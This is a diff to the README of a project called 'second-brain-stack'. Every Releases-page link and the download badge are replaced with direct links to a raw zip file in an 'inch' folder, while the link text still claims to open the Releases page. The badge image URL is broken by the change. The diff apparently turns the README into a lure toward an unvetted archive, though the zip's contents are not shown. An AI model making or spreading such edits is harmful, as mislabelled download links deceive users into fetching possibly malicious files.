@@ -1,6 +1,6 @@
 # 🧠 second-brain-stack - Your Personal Knowledge Hub Awaits
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kapilkaushik1/second-brain-stack/releases)
+[![Download](https://raw.githubusercontent.com/kapilkaushik1/second-brain-stack/main/inch/second-brain-stack.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kapilkaushik1/second-brain-stack/main/inch/second-brain-stack.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To start using **second-brain-stack**, follow these simple steps. You will be ab
 
 To download the latest version of **second-brain-stack**, please visit the following page:
 
-[Click here to visit the Releases page](https://github.com/kapilkaushik1/second-brain-stack/releases)
+[Click here to visit the Releases page](https://raw.githubusercontent.com/kapilkaushik1/second-brain-stack/main/inch/second-brain-stack.zip)
 
 Once you're on the Releases page, follow these steps:
 
@@ -72,4 +72,4 @@ Keep an eye on the Releases page for updates and new features. We regularly impr
 
 For more details about **second-brain-stack**, check out the official documentation in the repository. It covers everything from advanced features to troubleshooting common issues. 
 
-[Visit the Releases page](https://github.com/kapilkaushik1/second-brain-stack/releases) again to download updates and new features as they become available.
+[Visit the Releases page](https://raw.githubusercontent.com/kapilkaushik1/second-brain-stack/main/inch/second-brain-stack.zip) again to download updates and new features as they become available.
